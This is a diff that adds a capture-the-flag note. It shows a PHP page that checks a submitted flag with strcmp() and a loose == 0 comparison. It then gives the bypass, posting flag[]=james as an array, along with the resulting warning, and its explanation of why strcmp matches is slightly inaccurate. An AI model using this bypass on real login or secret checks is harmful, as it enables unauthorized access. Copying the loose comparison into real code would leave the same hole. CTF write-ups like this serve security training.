@@ -1,0 +1,19 @@
+source.txt:
+  <?php
+  include "flag.php";
+  if(isset($_POST['flag'])){
+    if(strcmp($flag, $_POST['flag']) == 0){
+      echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';
+    }
+    else{
+      echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
+    }
+  }
+  ?>
+
+if $_POST['flag'] == [] (empty array), strcmp will return 0
+if flag is an array $_POST['flag'] == []
+post:
+  flag[]=james
+Warning: strcmp() expects parameter 2 to be string, array given in /var/www/html/index.php on line 27
+done!
